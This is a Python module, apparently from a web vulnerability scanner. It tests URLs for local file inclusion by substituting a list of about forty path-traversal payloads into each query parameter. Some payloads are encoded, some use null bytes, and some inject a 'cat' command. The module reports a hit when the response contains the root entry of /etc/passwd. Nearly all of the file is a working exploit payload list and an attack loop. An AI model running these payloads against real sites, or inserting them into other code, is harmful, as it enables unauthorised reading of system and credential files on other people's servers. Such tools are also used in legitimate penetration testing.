import requests
from modules.logger import success

lfi_tests = [
    r'../../../../../etc/passwd',
    r'/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
    r'..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd',
    r'\\&apos;/bin/cat%20/etc/passwd\\&apos;',
    r'/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
    r'/..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../..%c0%af../etc/passwd',
    r'/etc/default/passwd',
    r'/./././././././././././etc/passwd',
    r'/../../../../../../../../../../etc/passwd',
    r'/../../../../../../../../../../etc/passwd^^',
    r'/..\../..\../..\../..\../..\../..\../etc/passwd',
    r'/etc/passwd',
    r'%0a/bin/cat%20/etc/passwd',
    r'%00../../../../../../etc/passwd',
    r'%00/etc/passwd%00',
    r'../../../../../../../../../../../../../../../../../../../../../../etc/passwd',
    r'../../etc/passwd',
    r'../etc/passwd',
    r'.\\./.\\./.\\./.\\./.\\./.\\./etc/passwd',
    r'etc/passwd',
    r'/etc/passwd%00',
    r'../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00',
    r'../../etc/passwd%00',
    r'../etc/passwd%00',
    r'/../../../../../../../../../../../etc/passwd%00.html',
    r'/../../../../../../../../../../../etc/passwd%00.jpg',
    r'/../../../../../../../../../../../etc/passwd%00.php',
    r'/../../../../../../../../../../../etc/passwd%00.txt',
    r'../../../../../../etc/passwd&=%3C%3C%3C%3C',
    r'....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/....\/etc/passwd',
    r'....\/....\/etc/passwd',
    r'....\/etc/passwd',
    r'....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//....//etc/passwd',
    r'....//....//etc/passwd',
    r'....//etc/passwd',
    r'/etc/security/passwd',
    r'///////../../../etc/passwd',
    r'..2fetc2fpasswd',
    r'..2fetc2fpasswd%00',
    r'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd',
    r'..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2f..2fetc2fpasswd%00'
]

def split_params(url):
    """
    Split the url into the base url and the parameters
    """
    split_url = url.split('?')
    base_url = split_url[0]
    params = split_url[1]
    return base_url, params

def get_params(params):
    """
    Get the parameters from the url
    """
    return params.split('&')

def exploit_lfi(base_url, url_params):
    for param in url_params:
        for test in lfi_tests:
            # create a new url with the test as the value of the url_params
            test_url = base_url + "?" + param + "=" + test
            # send a request to the new url
            response = requests.get(test_url)
            # if the response is 200, the test was successful
            if response.text.find("root:x:0:0:root:/root:/bin/bash") != -1:
                success("LFI on : " + test_url)
                break

def test_lfi(url):
    """
    Test for LFI
    """
    # split the url into the base url and the parameters
    base_url, params = split_params(url)
    # get the parameters from the url
    params_dict = get_params(params)
    # get the url_no_params
    url_no_params = base_url
    # get the url_params
    url_params = params_dict
    # exploit the lfi
    exploit_lfi(url_no_params, url_params)